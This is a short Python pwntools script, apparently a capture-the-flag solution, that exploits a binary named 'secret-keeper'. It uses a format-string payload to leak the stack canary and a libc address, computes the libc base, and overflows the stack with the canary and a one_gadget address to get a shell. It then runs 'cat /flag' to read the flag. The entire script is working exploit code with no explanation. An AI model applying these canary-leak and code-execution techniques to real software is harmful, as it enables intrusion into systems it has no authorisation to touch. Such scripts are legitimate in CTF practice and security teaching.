from pwn import *

HOST, PORT = '172.17.0.1', 10102
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./home/secret-keeper')
libc = ELF('./libc.so.6')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

payload = '%45$p,%47$p'

io.sendlineafter('>', payload)
io.readuntil('! ')
leak = [int(x,16) for x in io.readuntil('\n', drop=True).decode().split(',')]
canary, addr = leak
libc.address = addr - 0x270b3
info(f'canary: {hex(canary)}')
info(f'libc.address: {hex(libc.address)}')

one_gadget = libc.address + 0xe6c81
payload = flat({
    0x0108: [
        canary,
        0,
        one_gadget,
    ]
})
io.sendlineafter('>', payload)

# io.interactive()

io.clean(1)
io.sendline('cat /flag')
flag = io.readuntil('}').strip()
success(flag)
